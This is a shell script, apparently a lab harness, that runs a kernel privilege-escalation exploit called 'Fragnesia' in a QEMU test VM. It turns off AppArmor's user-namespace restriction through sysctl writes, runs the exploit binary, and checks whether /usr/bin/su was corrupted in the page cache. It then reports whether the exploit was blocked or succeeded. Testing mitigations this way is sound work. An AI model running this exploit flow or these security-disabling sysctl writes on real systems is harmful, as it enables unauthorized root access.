#!/bin/sh
# BusyBox‑compatible Fragnesia test runner
# Usage: sh /exploit/run.sh [fragnesia|fragnesia_pks]

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Strip leading slash if given, e.g., /fragnesia -> fragnesia
EXPLOIT_NAME="${1#/}"

if [ -z "$EXPLOIT_NAME" ] || [ "$EXPLOIT_NAME" != "$1" ] && [ "$1" != "/$EXPLOIT_NAME" ]; then
    echo -e "${RED}Usage: $0 [fragnesia|fragnesia_pks]${NC}"
    exit 1
fi

EXPLOIT_PATH="/exploit/$EXPLOIT_NAME"
[ -f "$EXPLOIT_PATH" ] || { echo -e "${RED}Error: $EXPLOIT_PATH not found${NC}"; exit 1; }

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  Fragnesia Test – QEMU Environment${NC}"
echo -e "${CYAN}  Exploit: $EXPLOIT_NAME${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

TARGET="/usr/bin/su"
[ -f "$TARGET" ] || { echo -e "${RED}Target $TARGET not found!${NC}"; exit 1; }

echo -e "Current user: $(id)"
echo -e "Target: $TARGET"

# Record original hash
ORIGINAL_MD5=$(md5sum "$TARGET" 2>/dev/null | awk '{print $1}')
echo -e "Original MD5: ${ORIGINAL_MD5:-unknown}"

# AppArmor / userns sysctls (already set by init, but try again just in case)
echo 0 > /proc/sys/kernel/apparmor_restrict_unprivileged_userns 2>/dev/null || true
echo 1 > /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || true

echo -e "${YELLOW}[*] Running exploit...${NC}"
cd /exploit
./"$EXPLOIT_NAME"
RC=$?
echo -e "Exploit exit code: $RC"

# Test if target became a shell-spawner (page cache compromise)
echo -e "${YELLOW}[*] Testing target...${NC}"
echo test | timeout 3 "$TARGET" --help >/dev/null 2>&1
TEST_RC=$?
COMPROMISED=0
case $TEST_RC in
    0|1) echo "Normal" ;;
    124) echo "Compromised (hang)" ; COMPROMISED=1 ;;
    127) echo "Compromised (shell spawn failed but code ran)" ; COMPROMISED=1 ;;
    *)   echo "Unknown: $TEST_RC" ; COMPROMISED=2 ;;
esac

# Inform the user that cache cleanup happens at shell restart
echo -e "${YELLOW}[*] Cleanup: page cache will be dropped when this shell exits${NC}"
echo -e "${YELLOW}       (or type 'exit' now to trigger it)${NC}"

echo -e "${CYAN}========================================${NC}"
case $COMPROMISED in
    0) echo -e "Verdict: ${GREEN}EXPLOIT BLOCKED${NC}" ;;
    1) echo -e "Verdict: ${RED}EXPLOIT SUCCESSFUL${NC}" ;;
    *) echo -e "Verdict: ${YELLOW}INCONCLUSIVE${NC}" ;;
esac
echo -e "${CYAN}========================================${NC}"